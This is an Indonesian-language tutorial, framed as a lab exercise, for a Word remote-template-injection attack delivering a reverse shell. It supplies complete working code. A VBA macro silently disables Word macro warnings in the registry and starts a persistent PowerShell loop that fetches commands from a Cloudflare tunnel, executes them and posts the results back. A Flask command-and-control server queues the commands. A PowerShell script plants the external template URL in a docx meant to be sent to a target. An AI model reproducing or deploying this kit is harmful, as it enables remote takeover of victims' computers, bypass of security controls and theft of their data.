# Menggunakan Konsep template injection

###### Materi: penjelasan umum terkait lab reverse shell

###### Media: docx + docm + doct + cloudflareTunneling

###### Prasarat: target harus menonaktifkan notifiakasi security MS-Word

---

**penjelasan**
dalam proses bercobaan dan analisis saya di [Konsep Macro dalam Bentuk .docm](konsep-macro.md) saya mendapati konsep terbaru - dalam artian baru saya ketahui - yaitu konsep **_template injection_**. pada awalnya saya terkejut dengan konsep ini yang mana penerapan script disini sangat berbeda dengan yang lainnya. jika di beberapa konsep sebelumnya kita harus menanam script jahat didalam dokument namun disini berbeda !.

dalam konsep ini script jahat tersebut dimuat dalam sebuat template yang di simpan didalam server tunneling kita, kemudian url dari server tersebut kita tanamkan kedalam file tujuan injeksi kita - jadi dengan kata lain script jahat itu dipanggil bukan di tanam

**cara kerja**

- attacker membagun server - disini dengan `methode tuneling`
- kemudian membuat script jahat didalam server dia sendiri yang sudah disusupi macro - disini dengan extensi `dotm` .
- kemudian attacker membuat file `docx` biasa yang didalamnya sudah ditanamkan url ke server attacker
- ketika file dibuka oleh target, file memanggil apa yang ada didalam url external tersebut - disini menjalankan `macro` tanpa ada izin
- terminal kemudian saling terhung dan reverse shell berhasil

**setup sistem**

- Buat `template.dotm` - pastikan semuaport dan tunneling disesuaikan ya
- Buat `server_queue.py` - ini untuk tempat saling terhubung
- Buat `laporan.docx` dengan menggunakan `powershell`, kita akan simpan dengan nama `create_docx.ps1`
- kemudian jalankan command ini :

```shell
powershell -ExecutionPolicy Bypass -File create_docx.ps1
```

- jalankan `server_queue.py`
- yang dibuka nanti adalah file `.docx` bukan file `.dotm`

* kemudian jalankan `send_cmd.py`

**Gambaran struktur akhir**

```bash
C:\Users\path_mu\path_mu\path_mu\
¦
+--> server_queue.py      (Server Flask + Serve Template)
+--> template.dotm        (Template + Macro PhantomLink)
+--> create_docx.ps1      (Script bikin laporan.docx)
+--> laporan.docx         (FILE YANG DIKIRIM KE TARGET!)
```

**source code**

- script code `template.dotm`

```bash
Private Sub Document_Open()
    PhantomLink
End Sub

Sub AutoOpen()
    PhantomLink
End Sub

Sub PhantomLink()
    Dim Objek_Shell As Object
    Dim URL_Shell As String
    Dim Perintah_PowerShell As String

    On Error Resume Next
    Set Objek_Shell = CreateObject("WScript.Shell")

    ' =========================================
    ' URL TUNNEL KAMU
    ' =========================================
    URL_Shell = "https://metadata-dated-acrobat-determines.trycloudflare.com/dns-query"
    ' =========================================

    ' Auto bypass registry (diam-diam)
    Objek_Shell.Run "powershell -Command ""$r='HKCU:\Software\Microsoft\Office\16.0\Word\Security';Set-ItemProperty -Path $r -Name 'VBAWarnings' -Value 1 -EA SilentlyContinue;Set-ItemProperty -Path $r -Name 'AccessVBOM' -Value 1 -EA SilentlyContinue""", 0, True

    ' Kill old PowerShell
    Objek_Shell.Run "powershell -Command ""Get-Process powershell -EA SilentlyContinue|Where-Object{$_.Id -ne $PID}|Stop-Process -Force""", 0, True

    ' Persistent Reverse Shell
    Perintah_PowerShell = "powershell -NoP -Ep Bypass -Command """ & _
        "$u='" & URL_Shell & "';" & _
        "Add-Type -AssemblyName System.Windows.Forms;" & _
        "[System.Windows.Forms.MessageBox]::Show('PhantomLink Active','Update');" & _
        "while($true){try{" & _
        "$c=(Invoke-RestMethod -Uri($u+'?action=get_command') -Method Get -TimeoutSec 10);" & _
        "if($c -eq 'exit'){break};" & _
        "if($c -and $c -ne 'IDLE'){" & _
        "Start-Job -ScriptBlock{" & _
        "param($c,$u)" & _
        "$r=(iex $c 2>&1|Out-String);" & _
        "$e=[uri]::EscapeDataString($r);" & _
        "$b='action=send_result&data='+$e;" & _
        "Invoke-RestMethod -Uri $u -Method Post -Body $b -ContentType 'application/x-www-form-urlencoded' -TimeoutSec 10|Out-Null" & _
        "} -ArgumentList $c,$u|Out-Null;" & _
        "}" & _
        "Start-Sleep -Seconds 2;" & _
        "}catch{Start-Sleep -Seconds 3}}" & _
        """"

    Objek_Shell.Run Perintah_PowerShell, 0, False
    Set Objek_Shell = Nothing
End Sub
```

- scipt code `server_queue.py`

```python
from flask import Flask, request, send_file
import urllib.parse
import threading
import os

app = Flask(__name__)

# State Management
pending_command = None
command_lock = threading.Lock()

# =========================================
# SERVE TEMPLATE (BUAT TEMPLATE INJECTION)
# =========================================
@app.route('/template.dotm')
def serve_template():
    template_path = os.path.join(os.path.dirname(__file__), 'template.dotm')
    if os.path.exists(template_path):
        return send_file(template_path, mimetype='application/vnd.ms-word.template.macroEnabled.12')
    return 'Template not found', 404

# =========================================
# REVERSE SHELL HANDLER
# =========================================
@app.route('/dns-query', methods=['GET', 'POST'])
def handler():
    global pending_command

    if request.method == 'GET':
        action = request.args.get('action', '')

        if action == 'get_command':
            with command_lock:
                if pending_command is not None:
                    cmd_to_send = pending_command
                    pending_command = None
                    print(f"[+] Command dikirim: {cmd_to_send}")
                    return cmd_to_send
                else:
                    return 'IDLE'

        elif action == 'ps_active':
            print("\n[*] TARGET CONNECTED!")
            print("[*] PhantomLink Active!\n")
            return 'OK'

    elif request.method == 'POST':
        action = request.form.get('action', '')

        if action == 'send_result':
            data = request.form.get('data', '')
            if data:
                decoded = urllib.parse.unquote(data)
                print(f"\n{'='*50}")
                print(f"[Result]:")
                print(decoded)
                print(f"{'='*50}\n")
            return 'OK'

    return 'OK'

@app.route('/admin/send', methods=['GET'])
def admin_send():
    global pending_command
    cmd = request.args.get('cmd', '')
    if cmd:
        with command_lock:
            pending_command = cmd
        print(f"[*] Command diantrekan: {cmd}")
        return f'OK: {cmd}'
    return 'Gunakan ?cmd=whoami'

if __name__ == '__main__':
    PORT = 4444
    print(f"[*] ==============================")
    print(f"[*] PhantomLink C2 + Template Server")
    print(f"[*] Port: {PORT}")
    print(f"[*] Template: http://localhost:{PORT}/template.dotm")
    print(f"[*] ==============================\n")
    app.run(host='0.0.0.0', port=PORT, threaded=True, debug=False)
```

- script untuk buat file `laporan.docx` dengan otomatisasi powershell:

```shell
# create_docx.ps1
$templateUrl = "https://metadata-dated-acrobat-determines.trycloudflare.com/template.dotm"
$outputFile = "laporan.docx"

# Buat docx kosong dari template
$word = New-Object -ComObject Word.Application
$word.Visible = $false
$doc = $word.Documents.Add()
$doc.SaveAs([ref]$outputFile, [ref]16) # wdFormatXMLDocument
$doc.Close()
$word.Quit()

# Inject template URL ke settings.xml.rels
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::Open($outputFile, "Update")

# Bikin settings.xml.rels
$relsXml = @"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="$templateUrl" TargetMode="External"/>
</Relationships>
"@

# Hapus entry lama kalau ada
try {
    $oldEntry = $zip.GetEntry("word/_rels/settings.xml.rels")
    if($oldEntry) { $oldEntry.Delete() }
} catch {}

# Buat entry baru
$entry = $zip.CreateEntry("word/_rels/settings.xml.rels")
$stream = $entry.Open()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.Write($relsXml)
$writer.Close()
$zip.Dispose()

Write-Host "[*] laporan.docx BERHASIL DIBUAT!"
Write-Host "[*] Template URL: $templateUrl"
Write-Host "[*] Kirim file ini ke target!"

```
